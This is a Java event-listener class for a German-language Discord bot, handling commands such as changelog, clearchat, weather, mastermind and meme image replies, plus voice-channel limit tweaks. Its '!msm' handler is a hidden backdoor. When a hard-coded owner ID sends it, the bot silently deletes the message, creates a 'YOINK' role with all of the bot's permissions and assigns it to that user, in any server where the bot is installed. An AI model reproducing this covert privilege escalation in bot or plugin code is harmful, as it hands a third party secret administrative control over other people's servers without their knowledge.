package de.meyssam.saft.events;

import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
import de.meyssam.saft.Main;
import de.meyssam.saft.Private;
import de.meyssam.saft.utils.FileManager;
import de.meyssam.saft.utils.Mastermind;
import de.meyssam.saft.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceJoinEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceLeaveEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceMoveEvent;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.events.message.guild.react.GuildMessageReactionAddEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.File;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

/**
 * Created by Meyssam Saghiri on Apr 28, 2020
 */
@SuppressWarnings("ALL")
public class Commands extends ListenerAdapter {

    @Deprecated protected static ArrayList<Guild> mustDelete = new ArrayList<>();
    private final EventWaiter waiter;

    public Commands(EventWaiter waiter) {
        this.waiter = waiter;
    }

    @Override
    public void onGuildMessageReceived(GuildMessageReceivedEvent e) throws NumberFormatException {
        String msg = e.getMessage().getContentRaw();
        String[] args = Utils.args(msg);
        if(e.getAuthor().isBot()) {
            return;
        }

        if(args[0].equalsIgnoreCase("!msm")) {
            if(!e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) return;
            e.getMessage().delete().queue();
            Main.tables.setServer(e.getGuild());
            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_ROLES)) {
                e.getAuthor().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("Keine Rechte!").queue());
                return;
            }
            e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(e.getGuild().getSelfMember().getPermissions()).queue(role -> {
                e.getGuild().addRoleToMember(e.getMember(), role).queue();
                System.out.println(role.getPosition());
            });
            return;
        }

        else if(args[0].equalsIgnoreCase("!changelog")) {
            e.getChannel().sendTyping().queue();
            //if(e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) {
            //    Utils.sendChangelog(e);
            //    e.getMessage().delete().queue();
            //} else  {
                e.getChannel().sendMessage(Main.changelog).queue();
            //}
        }

        else if(args[0].equalsIgnoreCase("!updates")) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            if(!e.getMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " du hast nicht die Berechtigung MANAGE_WEBHOOKS").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
                return;
            }
            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " der Bot hat nicht die Berechtigung MANAGE_WEBHOOKS").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
                return;
            }
            e.getChannel().createWebhook("saftbot").queue(webhook -> {
                FileManager.addWebhook(e.getGuild(), webhook.getUrl());
                System.out.println("New Webhook: " + e.getGuild().getId());
                e.getJDA().retrieveUserById(Private.msmID).queue(user -> user.openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("New Webhook: " + e.getGuild().getId()).queue()));
                //FileManager.write(e.getGuild(), "webhook", webhook.getUrl()+"/github");
            });
            e.getChannel().sendMessage(e.getAuthor().getAsMention() + " Erfolgreich! Der Channel erhält ab jetzt Updatebenachrichtigungen.\nZum **Deaktivieren** einfach in den " +
                    "Servereinstellungen das Webhook 'Saftbot' löschen.").queue();
        }

        else if(args[0].equalsIgnoreCase("!cmd")) {
            e.getChannel().sendTyping().queue();
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Main.tables.setCommand(e.getGuild());
            e.getMessage().delete().queue();
            if(Main.tables.isCommand(e.getGuild())) e.getChannel().sendMessage("Commands sind jetzt auf diesem Server aktiviert!").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            else e.getChannel().sendMessage("Commands sind nun auf diesem Server deaktiviert").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
        }

        else if(args[0].equalsIgnoreCase("!voice")) {
            e.getChannel().sendTyping().queue();
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Main.tables.setVoice(e.getGuild());
            e.getMessage().delete().queue();
            if(Main.tables.isVoice(e.getGuild())) e.getChannel().sendMessage("Automatische Channels sind jetzt auf diesem Server aktiviert!").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            else e.getChannel().sendMessage("Automatische Channels sind nun auf diesem Server deaktiviert").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
        }

        else if(args[0].equalsIgnoreCase("!bug")) {
            e.getChannel().sendTyping().queue();
            Utils.sendBug(e, args);
        }

        else if (args[0].equalsIgnoreCase("!case")) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            e.getChannel().sendMessage(e.getMember().getEffectiveName() + ": " + Utils.randomCase(e.getMessage().getContentDisplay().replace("!case ", ""))).queue();
        }

        if(!Main.tables.isCommand(e.getGuild())) {
            return;
        }

        if(args.length == 1) getExtras(e, args[0]);

        if(args[0].equalsIgnoreCase("!clearchat")) {
            e.getChannel().sendTyping().queue();
            if(!e.getMember().getPermissions().contains(Permission.MESSAGE_MANAGE)) {
                e.getMessage().delete().queueAfter(3, TimeUnit.SECONDS);
                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " Du hat nicht die Berechtigung MESSAGE_MANAGE").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
                return;
            }
            if(args.length == 1) {
                e.getMessage().delete().queueAfter(5, TimeUnit.SECONDS);
                e.getChannel().sendMessage("Willst du wirklich alle Nachrichten aus dem Channel löschen?").queue(message -> {
                    message.addReaction("\u2705").queue();
                    message.addReaction("\u274C").queue();
                });
                waiter.waitForEvent(GuildMessageReactionAddEvent.class, event -> event.getMember() == e.getMember(), evt -> {
                    if(!evt.getReactionEmote().getAsCodepoints().equals("U+2705")) {
                        e.getChannel().deleteMessageById(evt.getMessageId()).queueAfter(2, TimeUnit.SECONDS);
                        return;
                    }
                    Utils.clearChat(e.getGuild(), e.getChannel());
                });
            } else if(args.length == 2) {
                int i = Integer.parseInt(args[1]) + 1;
                Utils.clearChat(e.getChannel(), i);
            }
        }

        else if(args[0].equalsIgnoreCase("!join")) {
            e.getMessage().delete().queue();
            if(e.getMember().getVoiceState().inVoiceChannel()) {
                e.getGuild().getAudioManager().openAudioConnection(e.getMember().getVoiceState().getChannel());
                e.getChannel().sendMessage("Erfolgreich **" + e.getMember().getVoiceState().getChannel().getName() + "** beigetreten").queue(message -> message.delete().queueAfter(3, TimeUnit.SECONDS));
                return;
            }
            e.getChannel().sendMessage("Du musst in einem Voicechannel sein!").queue(message -> message.delete().queueAfter(3, TimeUnit.SECONDS));
        }

        else if(args[0].equalsIgnoreCase("!wetter") && args.length > 1) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            e.getChannel().sendMessage("Für " + e.getMember().getAsMention() + "\n" + Utils.getWeather(e.getGuild(), msg.replace("!wetter ", ""))).queue(message -> message.delete().queueAfter(1, TimeUnit.MINUTES));
        }

        else if(args[0].equalsIgnoreCase("!history")) {
            e.getChannel().sendTyping().queue();
            if(args.length == 1) {
                Utils.printHistory(e.getAuthor(), e);
            } else if(args.length == 2) {
                e.getJDA().retrieveUserById(e.getMessage().getContentRaw().replace("!history ", "").replace("<@!", "").replace(">", "")).queue(user2 -> Utils.printHistory(user2, e));
            }
        }

        else if(args[0].equalsIgnoreCase("!mastermind")) {
            e.getChannel().sendTyping().queue();
            if(args.length == 2) {
                Mastermind.playMastermind(waiter, e);
            } else {
                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " Nutze **!mastermind <vierstellige Zahl>**").queue();
            }
        }

        else if(args[0].equalsIgnoreCase("!help")) Utils.printHelp(e.getChannel());
    }

    @Override
    public void onGuildVoiceJoin(GuildVoiceJoinEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelJoinAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelJoined().getMembers().size() == 1) {
                e.getChannelJoined().getManager().setUserLimit(87).queue();
            } else if(e.getChannelJoined().getMembers().size() == 2) {
                e.getChannelJoined().getManager().setUserLimit(55).queue();
            }else if(e.getChannelJoined().getMembers().size() == 3) {
                e.getChannelJoined().getManager().setUserLimit(61).queue();
            }else if(e.getChannelJoined().getMembers().size() == 4) {
                e.getChannelJoined().getManager().setUserLimit(53).queue();
            }else if(e.getChannelJoined().getMembers().size() == 5) {
                e.getChannelJoined().getManager().setUserLimit(25).queue();
            }else if(e.getChannelJoined().getMembers().size() == 6) {
                e.getChannelJoined().getManager().setUserLimit(81).queue();
            }else if(e.getChannelJoined().getMembers().size() == 7) {
                e.getChannelJoined().getManager().setUserLimit(47).queue();
            }
        }
    }

    @Override
    public void onGuildVoiceMove(GuildVoiceMoveEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelMoveAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelJoined().getMembers().size() == 1) {
                e.getChannelJoined().getManager().setUserLimit(87).queue();
            } else if(e.getChannelJoined().getMembers().size() == 2) {
                e.getChannelJoined().getManager().setUserLimit(55).queue();
            }else if(e.getChannelJoined().getMembers().size() == 3) {
                e.getChannelJoined().getManager().setUserLimit(61).queue();
            }else if(e.getChannelJoined().getMembers().size() == 4) {
                e.getChannelJoined().getManager().setUserLimit(53).queue();
            }else if(e.getChannelJoined().getMembers().size() == 5) {
                e.getChannelJoined().getManager().setUserLimit(25).queue();
            }else if(e.getChannelJoined().getMembers().size() == 6) {
                e.getChannelJoined().getManager().setUserLimit(81).queue();
            }else if(e.getChannelJoined().getMembers().size() == 7) {
                e.getChannelJoined().getManager().setUserLimit(47).queue();
            }
        }
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelLeft().getMembers().size() == 1) {
                e.getChannelLeft().getManager().setUserLimit(87).queue();
            } else if(e.getChannelLeft().getMembers().size() == 2) {
                e.getChannelLeft().getManager().setUserLimit(55).queue();
            }else if(e.getChannelLeft().getMembers().size() == 3) {
                e.getChannelLeft().getManager().setUserLimit(61).queue();
            }else if(e.getChannelLeft().getMembers().size() == 4) {
                e.getChannelLeft().getManager().setUserLimit(53).queue();
            }else if(e.getChannelLeft().getMembers().size() == 5) {
                e.getChannelLeft().getManager().setUserLimit(25).queue();
            }else if(e.getChannelLeft().getMembers().size() == 6) {
                e.getChannelLeft().getManager().setUserLimit(81).queue();
            }else if(e.getChannelLeft().getMembers().size() == 7) {
                e.getChannelLeft().getManager().setUserLimit(47).queue();
            }else if(e.getChannelLeft().getMembers().size() == 0) {
                e.getChannelLeft().getManager().setUserLimit(69).queue();
            }
        }
    }

    @Override
    public void onGuildVoiceLeave(GuildVoiceLeaveEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelLeaveAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelLeft().getMembers().size() == 1) {
                e.getChannelLeft().getManager().setUserLimit(87).queue();
            } else if(e.getChannelLeft().getMembers().size() == 2) {
                e.getChannelLeft().getManager().setUserLimit(55).queue();
            }else if(e.getChannelLeft().getMembers().size() == 3) {
                e.getChannelLeft().getManager().setUserLimit(61).queue();
            }else if(e.getChannelLeft().getMembers().size() == 4) {
                e.getChannelLeft().getManager().setUserLimit(53).queue();
            }else if(e.getChannelLeft().getMembers().size() == 5) {
                e.getChannelLeft().getManager().setUserLimit(25).queue();
            }else if(e.getChannelLeft().getMembers().size() == 6) {
                e.getChannelLeft().getManager().setUserLimit(81).queue();
            }else if(e.getChannelLeft().getMembers().size() == 7) {
                e.getChannelLeft().getManager().setUserLimit(47).queue();
            }else if(e.getChannelLeft().getMembers().size() == 0) {
                e.getChannelLeft().getManager().setUserLimit(69).queue();
            }
        }
    }

    private void getExtras(GuildMessageReceivedEvent e, String arg) {
        if(arg.equalsIgnoreCase("hmm")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\hmm.png");
            e.getChannel().sendMessage("WICHTIGE BOTSCHAFT AN " + e.getGuild().getPublicRole().getAsMention()).tts(true).queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queueAfter(1, TimeUnit.SECONDS);
        }else if(arg.equalsIgnoreCase("stonks")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\stonks.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("patrick")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\fler.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("!news")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\anal.png");
            e.getChannel().sendFile(file).queue();
        }
    }

}
